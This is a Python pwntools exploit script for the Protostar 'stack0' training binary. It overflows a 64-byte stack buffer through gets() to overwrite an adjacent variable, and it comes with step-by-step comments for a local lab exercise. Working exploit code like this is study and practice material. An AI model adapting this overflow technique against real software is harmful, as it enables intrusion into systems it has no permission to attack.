from pwn import *
import os

# =============================================================================
# PHASE 1: ENVIRONMENT SETUP
# =============================================================================

# Define the target binary
exe_path = './vulnerable-programs/protostar-stack0/stack0'

# Sanity check: Ensure the binary actually exists before running
if not os.path.exists(exe_path):
    log.error(f"Binary not found at {exe_path}. \n"
              "Compile with: gcc stack0.c -o stack0 -fno-stack-protector -z execstack -no-pie -m32")

# Load binary metadata. checksec=False reduces clutter for simple challenges.
elf = ELF(exe_path, checksec=False)

# Set the context. This automates architecture (32-bit), endianness, 
# and logging style for the rest of the script.
context.binary = elf
context.log_level = 'info' # Switch to 'debug' to see raw bytes sent/received

# Configure the terminal for GDB. 
# Kali users usually use 'gnome-terminal'. If you use tmux, uncomment the second line.
context.terminal = ['gnome-terminal', '-e'] 
# context.terminal = ['tmux', 'splitw', '-h']

def start_process():
    """Starts the process locally."""
    return process(exe_path)

# =============================================================================
# PHASE 2: EXPLOIT STRATEGY (Variable Overwrite)
# =============================================================================

# The logic:
# 1. The C code likely defines: char buffer[64]; int modified;
# 2. In memory, 'modified' sits directly "above" 'buffer' on the stack.
# 3. gets() reads without checking limits.
# 4. If we write 65+ bytes, we spill out of 'buffer' and into 'modified'.

offset = 64 

# The value we want to write into the 'modified' variable.
# In C: if (modified != 0) -> So any non-zero value works.
# 0xdeadbeef is standard hacker tradition.
value_to_overwrite = 0xdeadbeef

# Construct the payload
# flat() creates: [ 64 bytes of padding ] + [ 0xdeadbeef (packed as 4 bytes) ]
payload = flat({
    offset: value_to_overwrite
})

# =============================================================================
# PHASE 3: EXECUTION
# =============================================================================

io = start_process()

# --- OPTIONAL: GDB DEBUGGING ---
# Uncomment this block to pause execution and inspect memory before the crash.
# useful commands to type in GDB:
#   x/20wx $esp   -> View 20 words of the stack in hex
#   continue      -> Resume the script
# -------------------------------
# gdb.attach(io, gdbscript='''
#     b *main
#     continue
# ''')

log.info("Sending payload to overwrite local variable...")

# CRITICAL NOTE ON I/O: 
# Sometimes 'recvuntil' hangs if the server doesn't flush stdout. 
# For simple overflow challenges, sending blindly is often more reliable.
io.sendline(payload)

# Read all remaining output to see if we won
output = io.recvall().decode(errors='ignore')

print("\n" + "="*30 + " OUTPUT " + "="*30)
print(output)
print("="*68 + "\n")

# Verify success
if "changed" in output.lower():
    log.success("SUCCESS: Variable 'modified' was overwritten!")
else:
    log.failure("FAILED: Variable remained 0.")